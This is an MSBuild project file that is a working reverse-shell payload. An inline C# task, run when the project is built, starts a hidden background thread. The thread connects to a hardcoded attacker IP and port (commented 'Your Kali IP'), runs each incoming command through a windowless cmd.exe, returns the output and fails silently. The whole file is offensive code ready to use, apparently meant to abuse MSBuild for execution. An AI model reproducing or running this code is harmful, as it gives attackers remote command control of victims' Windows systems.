<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Connect">
    <ReverseShell />
  </Target>
  
  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory" 
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Net.Sockets;
        using System.Diagnostics;
        using System.Text;
        using System.IO;
        using System.Threading;

        public class ReverseShell : Microsoft.Build.Utilities.Task {
            public override bool Execute() {
                Thread thread = new Thread(new ThreadStart(StartShell));
                thread.IsBackground = true;
                thread.Start();
                return true;
            }
            
            private void StartShell() {
                string host = "192.168.1.8";  // Your Kali IP
                int port = 4444;
                
                try {
                    using(TcpClient client = new TcpClient(host, port)) {
                        using(NetworkStream stream = client.GetStream()) {
                            // Send welcome message
                            string welcome = "=== MSBuild Reverse Shell Connected ===\r\n";
                            byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
                            stream.Write(welcomeBytes, 0, welcomeBytes.Length);
                            
                            string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
                            byte[] promptBytes = Encoding.ASCII.GetBytes(prompt);
                            stream.Write(promptBytes, 0, promptBytes.Length);
                            
                            byte[] buffer = new byte[1024];
                            
                            // Main loop - keep connection alive
                            while(client.Connected) {
                                // Check if data is available (non-blocking)
                                if(stream.DataAvailable) {
                                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                                    if(bytesRead > 0) {
                                        string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
                                        
                                        if(command == "exit") break;
                                        if(string.IsNullOrEmpty(command)) continue;
                                        
                                        // Execute command
                                        string result = ExecuteCommand(command);
                                        
                                        // Send result back
                                        byte[] outputBytes = Encoding.ASCII.GetBytes(result);
                                        stream.Write(outputBytes, 0, outputBytes.Length);
                                        
                                        // Send new prompt
                                        stream.Write(promptBytes, 0, promptBytes.Length);
                                    }
                                }
                                
                                // Small delay to prevent CPU spinning
                                Thread.Sleep(100);
                            }
                        }
                    }
                } catch (Exception) {
                    // Silent fail
                }
            }
            
            private string ExecuteCommand(string command) {
                try {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    if(!string.IsNullOrEmpty(error)) {
                        output += "\r\n" + error;
                    }
                    
                    return output + "\r\n";
                } catch(Exception ex) {
                    return "Error: " + ex.Message + "\r\n";
                }
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
